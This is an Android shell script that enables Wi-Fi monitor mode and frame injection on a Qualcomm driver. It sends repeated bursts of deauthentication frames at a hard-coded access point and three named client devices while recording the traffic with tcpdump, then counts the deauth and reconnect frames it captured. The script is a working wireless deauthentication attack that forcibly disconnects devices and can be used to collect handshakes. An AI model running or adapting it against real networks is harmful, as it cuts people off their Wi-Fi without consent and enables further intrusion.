#!/system/bin/sh
LOG=/data/local/tmp/deauth_cap.log
P=/sys/module/qca_cld3_peach_v2/parameters
BSSID=3c:64:cf:66:81:dc
PCAP=/data/local/tmp/deauth_cap.pcap
exec > "$LOG" 2>&1
echo "==== DEAUTH+CAPTURE $(date) ===="
sh /data/local/tmp/mon_on.sh
sleep 2
iw dev wlan0 set channel 1
echo 1 > $P/mon_inject_enable
echo "con_mode=$(cat $P/con_mode) inject=$(cat $P/mon_inject_enable)"
rm -f $PCAP
timeout 35 tcpdump -i wlan0 -nn -w $PCAP 2>/dev/null &
TD=$!
sleep 2
echo "AVIUM_DEAUTH_BURST_START" > /dev/kmsg
for round in 1 2 3 4; do
  for C in a0:41:47:4f:d7:e7 bc:32:5f:9d:8b:02 9c:4e:36:ac:6c:5c; do
    /data/local/tmp/mon_inject wlan0 60 $BSSID $C
  done
done
echo "AVIUM_DEAUTH_BURST_END" > /dev/kmsg
echo "inject done $(date); MON-INJECT logged=$(dmesg | grep -c 'AVIUM MON-INJECT')"
sleep 3
kill $TD 2>/dev/null; sleep 1
echo "---- CAPTURE ANALYSIS ----"
echo "total frames captured: $(tcpdump -r $PCAP -nn 2>/dev/null | wc -l)"
echo "DEAUTH frames in air (our injection if radiated):"; tcpdump -r $PCAP -nn 2>/dev/null | grep -ci "deauth"
tcpdump -r $PCAP -nn 2>/dev/null | grep -i "deauth" | head -6
echo "AUTH/ASSOC (target reconnect) frames:"; tcpdump -r $PCAP -nn 2>/dev/null | grep -icE "authentication|assoc req|assoc resp|reassoc"
echo "per-target frame counts:"
for C in a0:41:47:4f:d7:e7 bc:32:5f:9d:8b:02 9c:4e:36:ac:6c:5c; do
  echo "  $C: $(tcpdump -r $PCAP -nn -e 2>/dev/null | grep -ic $C)"
done
echo "---- REVERT ----"
echo 0 > $P/mon_inject_enable
sh /data/local/tmp/mon_off.sh
echo "==== DONE ===="
